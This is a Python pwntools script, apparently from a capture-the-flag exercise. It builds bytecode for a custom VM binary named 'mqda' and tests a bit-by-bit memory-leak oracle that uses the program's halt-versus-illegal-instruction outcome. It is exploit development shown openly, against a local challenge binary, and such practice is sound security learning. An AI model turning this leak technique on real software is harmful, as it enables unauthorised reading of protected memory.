#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'warning'

# VM instruction encoders
def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def store_mem_reg(reg, offset):
    return bytes([0x21, reg, offset])

def load_reg_mem(reg, offset):
    return bytes([0x61, reg, offset])

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def add_reg_imm(reg, imm32):
    return bytes([0x44, reg]) + p32(imm32)

def sub_reg_imm(reg, imm32):
    return bytes([0x45, reg]) + p32(imm32)

def and_reg_imm(reg, imm32):
    return bytes([0x48, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x49, reg]) + p32(imm32)

def cmp_reg_imm(reg, imm32):
    return bytes([0x4d, reg]) + p32(imm32)

def jmp_reg(reg):
    return bytes([0x0e, reg])

def jne_reg(reg):
    return bytes([0x10, reg])

def je_reg(reg):
    return bytes([0x0f, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_leak_code(addr, offset, test_bit, test_value):
    """
    Create code that:
    1. Reads from addr+offset
    2. Tests if specific bit equals test_value
    3. Returns TERMINATED if match, ILLEGAL if no match
    """
    code = b''
    
    # addr is where we want to read from
    # offset is the byte offset within the page
    # test_bit is which bit (0-7) to test
    # test_value is expected value (0 or 1)
    
    # Set SP to addr (to trigger page allocation and read)
    sp_addr = (addr & 0xFFFFFF00) | (offset & 0xFF)
    code += mov_reg_imm(15, sp_addr)  # r15 = SP
    
    # Pop value into r0 (reads 4 bytes from page[offset+4])
    code += pop_reg(0)
    
    # Now r0 has the value at addr+offset..addr+offset+3
    # Isolate the bit we want
    code += shr_reg_imm(0, test_bit)  # Shift right to get bit into position 0
    code += and_reg_imm(0, 1)          # Mask to just bit 0
    
    # Compare with expected value
    code += cmp_reg_imm(0, test_value)
    
    # If equal, jump to HLT (TERMINATED)
    # If not equal, fall through to illegal instruction
    hlt_addr = len(code) + 6 + 6 + 1  # After this instruction + jne + illegal
    code += mov_reg_imm(1, hlt_addr)   # r1 = address of HLT
    code += je_reg(1)                  # Jump if equal
    
    # Illegal instruction (will be reached if not equal)
    code += trigger_illegal()
    
    # HLT (will be reached if equal)
    code += hlt()
    
    return code

def test_bit_leak():
    """Test if we can leak a single bit"""
    
    # Try to leak bit 0 of the value at address 0 (our code)
    # Our code starts with 0x41 (mov_reg_imm opcode with mode), so bit 0 should be 1
    
    code = create_leak_code(0x00000000, 0, 0, 1)  # Test if bit 0 == 1
    
    p = process(['./mqda'], level='error')
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    if b'TERMINATED' in output:
        print("[+] Bit 0 == 1: MATCH")
    elif b'ILLEGAL' in output:
        print("[-] Bit 0 == 1: NO MATCH")
    else:
        print(f"[?] Unexpected output: {output}")
    
    # Now test the opposite
    code = create_leak_code(0x00000000, 0, 0, 0)  # Test if bit 0 == 0
    
    p = process(['./mqda'], level='error')
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    if b'TERMINATED' in output:
        print("[+] Bit 0 == 0: MATCH")
    elif b'ILLEGAL' in output:
        print("[-] Bit 0 == 0: NO MATCH")
    else:
        print(f"[?] Unexpected output: {output}")

def main():
    test_bit_leak()

if __name__ == '__main__':
    main()
